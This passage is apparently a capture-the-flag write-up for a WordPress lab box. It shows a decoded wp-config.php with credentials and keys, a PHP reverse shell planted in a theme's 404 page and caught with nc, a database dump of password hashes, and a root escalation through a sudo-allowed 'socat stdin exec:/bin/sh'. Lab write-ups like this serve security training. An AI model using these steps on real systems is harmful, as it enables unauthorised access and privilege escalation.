PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0Kd29yZHByZXNzOw0KZGVmaW5lKCAnV1BfU0lURVVSTCcsICdodHRwOi8vJyAuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLicvd29yZHByZXNzJyk7DQpkZWZpbmUoICdXUF9IT01FJywgJ2h0dHA6Ly8nIC4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJy93b3JkcHJlc3MnKTsNCg0KLyoqI0ArDQogKiBBdXRoZW50aWNhdGlvbiBVbmlxdWUgS2V5cyBhbmQgU2FsdHMuDQogKg0KICogQ2hhbmdlIHRoZXNlIHRvIGRpZmZlcmVudCB1bmlxdWUgcGhyYXNlcyENCiAqIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcgdGhlIHtAbGluayBodHRwczovL2FwaS53b3JkcHJlc3Mub3JnL3NlY3JldC1rZXkvMS4xL3NhbHQvIFdvcmRQcmVzcy5vcmcgc2VjcmV0LWtleSBzZXJ2aWNlfQ0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4gVGhpcyB3aWxsIGZvcmNlIGFsbCB1c2VycyB0byBoYXZlIHRvIGxvZyBpbiBhZ2Fpbi4NCiAqDQogKiBAc2luY2UgMi42LjANCiAqLw0KZGVmaW5lKCAnQVVUSF9LRVknLCAgICAgICAgICd6a1klbSVSRlliOnUsL2xxLWlafjhmakVOZElhU2I9Xms8M1pyLzBEaUxacVB4enxBdXFsaTZsWi05RFJhZ0pQJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfS0VZJywgICdpQVlhazxfJn52OW8re2JAUlBSNjJSOSBUeS0gNlUteUg1YmFVRHs7bmRTaUNbXXFvc3hTQHNjdSZTKWQkSFtUJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX0tFWScsICAgICdhUGRfKnNCZj1adWMrK2FdNVZnOT1QfnUwM1EsenZwW2VVZS99KUQ9Ok55aFVZe0tYUl10N300MlVwa1tyNz9zJyApOw0KZGVmaW5lKCAnTk9OQ0VfS0VZJywgICAgICAgICdAaTtUKHt4Vi9mdkUhcyteZGU3ZTRMWDN9TlRAIGo7YjRbejNfZkZKYmJXKG5vIDNPN0ZAc3gwIW95KE9gaCNNJyApOw0KZGVmaW5lKCAnQVVUSF9TQUxUJywgICAgICAgICdCIEFUQGk+KiBOI1c8biEqfGtGZE1uUU4pPl49XihpSHA4VXZnPH4ySH56Rl1pZHlRPXtAfTF9KnJ7bFowLFdZJyApOw0KZGVmaW5lKCAnU0VDVVJFX0FVVEhfU0FMVCcsICdoeDhJOitUejhuMzM1V2htels+JFVaOzhyUVlLPlJ6XVZHeUJkbW83PSZHWiFMTyxwQU1zXWYhelZ9eG46NEFQJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX1NBTFQnLCAgICd4N3I+fGMwTUxecztTdzIqVSF4LntgNUQ6UDF9Vz0gL2Npe1E8dEVNPXRyU3YxZWVkfF9mc0xgeV5TLFhJPFJZJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICd2T2IlV3R5fSR6eDlgfD40NUlwQHN5WiBdRzpDM3xTZEQtUDM8e1lQOi5qUERYKUh9d0dtMSpKXk1TYnMkMWB8JyApOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBEYXRhYmFzZSBUYWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIGRvY3VtZW50YXRpb24uDQogKg0KICogQGxpbmsgaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3N1cHBvcnQvYXJ0aWNsZS9kZWJ1Z2dpbmctaW4td29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgcHVibGlzaGluZy4gKi8NCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==
```

Let's decode it now, using [2]:

```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@ckme@123' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

wordpress;
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'zkY%m%RFYb:u,/lq-iZ~8fjENdIaSb=^k<3Zr/0DiLZqPxz|Auqli6lZ-9DRagJP' );
define( 'SECURE_AUTH_KEY',  'iAYak<_&~v9o+{b@RPR62R9 Ty- 6U-yH5baUD{;ndSiC[]qosxS@scu&S)d$H[T' );
define( 'LOGGED_IN_KEY',    'aPd_*sBf=Zuc++a]5Vg9=P~u03Q,zvp[eUe/})D=:NyhUY{KXR]t7}42Upk[r7?s' );
define( 'NONCE_KEY',        '@i;T({xV/fvE!s+^de7e4LX3}NT@ j;b4[z3_fFJbbW(no 3O7F@sx0!oy(O`h#M' );
define( 'AUTH_SALT',        'B AT@i>* N#W<n!*|kFdMnQN)>^=^(iHp8Uvg<~2H~zF]idyQ={@}1}*r{lZ0,WY' );
define( 'SECURE_AUTH_SALT', 'hx8I:+Tz8n335Whmz[>$UZ;8rQYK>Rz]VGyBdmo7=&GZ!LO,pAMs]f!zV}xn:4AP' );
define( 'LOGGED_IN_SALT',   'x7r>|c0ML^s;Sw2*U!x.{`5D:P1}W= /ci{Q<tEM=trSv1eed|_fsL`y^S,XI<RY' );
define( 'NONCE_SALT',       'vOb%Wty}$zx9`|>45Ip@syZ ]G:C3|SdD-P3<{YP:.jPDX)H}wGm1*J^MSbs$1`|' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

(If we remember the comments we found in the `hackathons` website, we could have found the same password, with a vigenere decypher, with the key `KeepGoing`. [3] with text `Dvc W@iyur@123` and key `KeepGoing`).

SSH didn't work. Let's try the wp-admin panel.

Yaay !!

Following [4], let's put a reverse shell code from [5] in 404 page.

Let's start a listener:

```bash
nc -lnvp 4444

listening on [any] 4444 ...
```

Then go to page 404.php: http://10.10.97.156/wordpress/?p=404.php

```bash
connect to [10.6.31.49] from (UNKNOWN) [10.10.97.156] 37386
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 22:31:06 up  1:50,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Sweet !!!

Let's get our flag:

```bash
$ ls -al /home/elyana
total 48
drwxr-xr-x 6 elyana elyana 4096 Oct  7  2020 .
drwxr-xr-x 3 root   root   4096 Oct  5  2020 ..
-rw------- 1 elyana elyana 1632 Oct  7  2020 .bash_history
-rw-r--r-- 1 elyana elyana  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elyana elyana 3771 Apr  4  2018 .bashrc
drwx------ 2 elyana elyana 4096 Oct  5  2020 .cache
drwxr-x--- 3 root   root   4096 Oct  5  2020 .config
drwx------ 3 elyana elyana 4096 Oct  5  2020 .gnupg
drwxrwxr-x 3 elyana elyana 4096 Oct  5  2020 .local
-rw-r--r-- 1 elyana elyana  807 Apr  4  2018 .profile
-rw-r--r-- 1 elyana elyana    0 Oct  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 elyana elyana   59 Oct  6  2020 hint.txt
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
$ cat /home/elyana/hint.txt
Elyana's user password is hidden in the system. Find it ;)
```

First, let's stabilize the shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-4.4$
```

Next, let's login in the SQL:

```bash
bash-4.4$ mysql -u elyana -p 
mysql -u elyana -p
Enter password: H@ckme@123

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 90
Server version: 10.1.44-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Let's check databases:

```bash
MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.00 sec)

MariaDB [(none)]> use wordpress
use wordpress
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
show tables;
+----------------------------+
| Tables_in_wordpress        |
+----------------------------+
| wp_commentmeta             |
| wp_comments                |
| wp_links                   |
| wp_masta_campaign          |
| wp_masta_cronapi           |
| wp_masta_list              |
| wp_masta_reports           |
| wp_masta_responder         |
| wp_masta_responder_reports |
| wp_masta_settings          |
| wp_masta_subscribers       |
| wp_masta_support           |
| wp_options                 |
| wp_postmeta                |
| wp_posts                   |
| wp_reflex_gallery          |
| wp_reflex_gallery_images   |
| wp_term_relationships      |
| wp_term_taxonomy           |
| wp_termmeta                |
| wp_terms                   |
| wp_usermeta                |
| wp_users                   |
+----------------------------+
23 rows in set (0.00 sec)

MariaDB [wordpress]> 
```

```bash
MariaDB [wordpress]> select * from wp_users
select * from wp_users
    -> ;
;
+----+------------+------------------------------------+---------------+---------------+--------------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email    | user_url                       | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------+--------------------------------+---------------------+---------------------+-------------+--------------+
|  1 | elyana     | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | elyana        | none@none.com | http://192.168.8.110/wordpress | 2020-10-05 19:55:50 |                     |           0 | elyana       |
+----+------------+------------------------------------+---------------+---------------+--------------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
```

We could try to crack the hash, as we have the salt from `wp-config.php`. Actually, `elyana` password should be `H@ckme@123`, so, no need to crack it. I think I went too far. Let's get back to the hint `Elyana's user password is hidden in the system. Find it ;)`.

After uploading `linpeas.sh` to `/tmp` we found some SUID files:

```bash
-rwsr-sr-x 1 root root 1.1M Jun  6  2019 /bin/bash
-rwsr-sr-x 1 root root 59K Jan 18  2018 /bin/chmod
-rwsr-sr-x 1 root root 392K Apr  4  2018 /usr/bin/socat
```

Linpeas also revealed some interesting files:

```bash
/etc/mysql/conf.d/private.txt
```

Let's check this out:

```bash
bash-4.4$ cat /etc/mysql/conf.d/private.txt

user: elyana
password: E@syR18ght
```

Let's login as `elyana`:

```bash
bash-4.4$ su elyana
Password: E@syR18ght

bash-4.4$ whoami
elyana
```

Let's get the flag:

```bash
bash-4.4$ cat /home/elyana/user.txt

VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
```

Hum, not so simple. Let's put this in [2] and use Magic. With a decode from base64 we find:

```
THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
```

Let's get root !!! We already found some SUID binaries. Let's check them on [6], but before let's check `sudo`:

```bash
bash-4.4$ sudo -l

Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
```

Interesting, it's also a binary with SUID. Let's check [6] for exploit:

```bash
socat stdin exec:/bin/sh
```

should break out of restricted environment.

```bash
bash-4.4$ sudo /usr/bin/socat stdin exec:/bin/sh

whoami
root
```

Perfect !!! Let's get the root flag.

```bash
cat /root/root.txt

VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
```

Same as before, let's decode from base64:

```
THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}
```

And we're done !!!

## Flag

1. `THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}`

2. `THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}`
